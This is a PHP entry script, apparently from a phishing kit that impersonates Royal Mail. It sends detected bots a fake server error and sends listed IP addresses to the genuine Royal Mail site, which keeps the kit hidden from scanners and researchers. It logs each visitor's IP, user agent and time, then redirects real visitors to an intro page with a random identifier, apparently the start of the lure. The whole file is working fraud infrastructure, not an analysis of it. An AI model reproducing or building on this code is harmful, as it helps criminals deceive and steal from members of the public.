<?php
require_once './vendor/autoload.php';
session_start();
error_reporting(0);

use DeviceDetector\Parser\Device\DeviceParserAbstract;

include "./control.php";

DeviceParserAbstract::setVersionTruncation(DeviceParserAbstract::VERSION_TRUNCATION_NONE);

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {

	$vis_ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
	$vis_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
	$vis_ip = $_SERVER['REMOTE_ADDR'];
}

$userAgent = $_SERVER['HTTP_USER_AGENT'];
$dd = new DeviceDetector\DeviceDetector($userAgent);

$dd->parse();

// if (strtolower($dd->getOs()['name']) !== "ios" && strtolower($dd->getOs()['name']) !== 'android') {
// 	header("Location: https://www.royalmail.com/");
// 	exit;
// }

if ($dd->isBot()) {
	header($_SERVER['SERVER_PROTOCOL'] . ' 500 Internal Server Error', true, 500);
	die("<h1>500 Internal Server Error</h1>");
}

$data = file_get_contents('ips.txt');
if (strpos($data, "\r\n") !== false) {
	$data = explode("\r\n", $data);
} else {
	$data = explode("\n", $data);
}

if (in_array($vis_ip, $data)) {
	echo '<html><head><meta http-equiv="refresh" content="0;URL=https://www.royalmail.com/" /></head><body></body></html>';
	die();
}

if ($pageonline == 0) {
	die();
}

if ($ip_logger == 1) {
	include "./ips.php";
}

$_SESSION["valid"] = 1;
if (!isset($_SESSION["identifier"])) {
	$_SESSION["identifier"] = uniqid() . '-' . uniqid();
}

$agent = $_SERVER['HTTP_USER_AGENT'];
$time = gmdate("H:i:s d-n-Y");
$file = fopen("visits.txt", "a+");
fwrite($file, $_SERVER['SERVER_NAME'] . " - " . $vis_ip . " - " . $agent . " - " . $time . "\r\n");
fclose($file);

echo '<!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="refresh" content="0;URL=intro.php?freq=new&topic=tx_clam&appID=' . randomCha(rand(40, 60)) . '" />
</head>
<body>
&nbsp;
</body>
</html>';
?>